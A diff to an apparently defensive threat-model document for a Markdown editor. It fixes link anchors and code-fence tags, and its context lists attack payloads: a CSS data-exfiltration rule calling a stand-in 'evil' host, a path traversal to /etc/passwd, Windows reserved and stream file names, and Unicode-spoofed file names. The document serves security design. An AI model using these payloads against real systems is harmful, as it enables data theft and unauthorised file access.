@@ -336,7 +336,7 @@ an image decoder will render, the bytes are in the renderer's memory.
 to the document's real directory *and* to the set of roots the user has opened;
 a separate extension allowlist (`png jpg jpeg gif webp bmp svg ico avif`); refusal
 of `file:` URLs, absolute paths, and UNC paths; a size cap; and a dimension cap.
-Full treatment in [03-filesystem-safety.md §2](./03-filesystem-safety.md#2-path-traversal-the-windows-special-cases).
+Full treatment in [03-filesystem-safety.md §2](./03-filesystem-safety.md#2-path-traversal-and-the-windows-special-cases).
 
 **Residual risk.** TOCTOU: a symlink swapped between the `realpath` check and the
 `open`. Mitigated by opening the resolved path with `O_NOFOLLOW`-style semantics
@@ -393,7 +393,7 @@ exfiltration (`input[value^="a"]{background:url(//evil/a)}`) if forms were prese
 states plainly that it "is not a CSS sanitizer" and that CSS-based data
 exfiltration is an explicit non-goal, so this has to be an allowlist decision,
 not a sanitizer feature. Table alignment therefore uses classes
-([05-rendering/01-ast-to-html.md §1.6](./01-ast-to-html.md#16-tables)). CSP
+([05-rendering/01-ast-to-html.md §1.6](../05-rendering/01-ast-to-html.md#16-tables)). CSP
 `style-src 'self' 'unsafe-inline'` (we need inline for runtime theme variables) —
 never `https:`, so no remote stylesheet.
 
@@ -611,8 +611,8 @@ this is mostly a Linux concern. Junction points and hard links remain possible.
 
 **Payload.**
 
-```
-$ mv notes.md notes.md.tmp && printf '# Half-written' > notes.md && mv notes.md.tmp notes.md &
+```bash
+mv notes.md notes.md.tmp && printf '# Half-written' > notes.md && mv notes.md.tmp notes.md &
 ```
 
 Editor behaviours that produce garbage rather than an attack: write-in-place
@@ -657,27 +657,27 @@ names zip-slip explicitly.
 
 **Payloads.**
 
-```
+```text
 ../../../../etc/passwd.md
 ```
 
-```
+```text
 CON.md
 NUL.md
 COM1.md
 aux.md          (Windows reserved device names)
 ```
 
-```
+```text
 notes.md::$DATA
 ```
 
-```
+```text
 notes
 .‮gnp.exe.md    (U+202E RIGHT-TO-LEFT OVERRIDE — displays as "notes.exe.md")
 ```
 
-```
+```text
 README.md      (U+200B zero-width spaces — invisible, looks like "README.md")
 ```
 
